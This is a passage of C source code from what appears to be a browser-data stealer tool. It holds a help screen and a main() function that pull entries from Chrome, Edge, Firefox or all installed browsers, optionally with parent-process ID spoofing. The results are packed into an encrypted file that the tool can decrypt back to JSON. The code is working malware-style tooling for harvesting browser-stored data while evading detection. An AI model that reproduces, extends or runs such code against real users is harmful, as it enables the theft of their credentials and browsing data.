    wprintf(L"Decryption Options:\n");
    wprintf(L"  /dec:<sig>   Decrypt Mode With The Same Signature Used When Encrypting(1-8 Bytes)\n");
    wprintf(L"  /i <file>    Input Encrypted Pack File (Required For Decryption)\n");
    wprintf(L"  /?           Show This Help Message\n\n");
    wprintf(L"Examples:\n");
    wprintf(L"  %S                                        Extract %d Entries From The Default Browser\n", pszExeName, MAX_DISPLAY_COUNT);
    wprintf(L"  %S /b:chrome /b:edge /spoof /e:100        Extract 100 Entries From Chrome And Edge With PPID Spoofing\n", pszExeName);
    wprintf(L"  %S /b:firefox /e:all /enc:SIG213          Extract All Entries From FireFox To Encrypted Pack\n", pszExeName);
    wprintf(L"  %S /b:all /e:all /enc:0xCAFEBABE          Extract All Entries From All Browsers To Encrypted Pack\n", pszExeName);
    wprintf(L"  %S /dec:0xCAFEBABE /i EncPack-XXXXX.bin   Decrypt Pack File To JSON Files\n\n", pszExeName);
    return FALSE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

int main(int argc, char* argv[])
{
    CMD_ARGUMENTS   CmdArgs         = { 0 };
    DWORD           dwSuccessCount  = 0,
                    dwFailCount     = 0,
                    dwSkipCount     = 0;
    INT             nResult         = -1;

    if (!ParseArguments(argc, argv, &CmdArgs))
        return -1;

    if (!InitializeExeProjDynamicFunctions())
        return -1;

    // Decrypt mode
    if (CmdArgs.bDecryptMode)
    {
        if (DecryptJsonPack(CmdArgs.pszInputFile, CmdArgs.Signature, CmdArgs.dwSignatureLen))
            nResult = 0;

        wprintf(L"[*] Bye!");
        return nResult;
    }

    if (CmdArgs.bAllBrowsers)
    {
        for (DWORD i = 0; i < BROWSER_COUNT; i++)
        {
            if (!IsBrowserInstalled((BROWSER_TYPE)i))
            {
                DBGV("[i] %s: Not Installed, Skipping...\n", GetBrowserName((BROWSER_TYPE)i));
                dwSkipCount++;
                continue;
            }

            if (ExtractFromBrowser((BROWSER_TYPE)i, GetBrowserOutputFile((BROWSER_TYPE)i), CmdArgs.dwMaxEntries, CmdArgs.bSpoof, CmdArgs.bEncryptJson, CmdArgs.Signature, CmdArgs.dwSignatureLen))
                dwSuccessCount++;
            else
                dwFailCount++;
        }

        wprintf(L"[*] Summary: %lu Succeeded, %lu Failed, %lu Skipped\n", dwSuccessCount, dwFailCount, dwSkipCount);

        nResult = (dwSuccessCount > 0) ? 0 : -1;
    }
    else
    {
        for (DWORD i = 0; i < CmdArgs.dwBrowserCount; i++)
        {
            LPCSTR pszOutputFile = GetBrowserOutputFile(CmdArgs.BrowserTypes[i]);

            if (!ExtractFromBrowser(CmdArgs.BrowserTypes[i], pszOutputFile, CmdArgs.dwMaxEntries, CmdArgs.bSpoof, CmdArgs.bEncryptJson, CmdArgs.Signature, CmdArgs.dwSignatureLen))
                nResult = -1;
        }
    }

    wprintf(L"[*] Bye!");

    return nResult;
}


/*
TODO:

4. [BUG] opera gx is getting skipped
6. Replace SQLite

*/
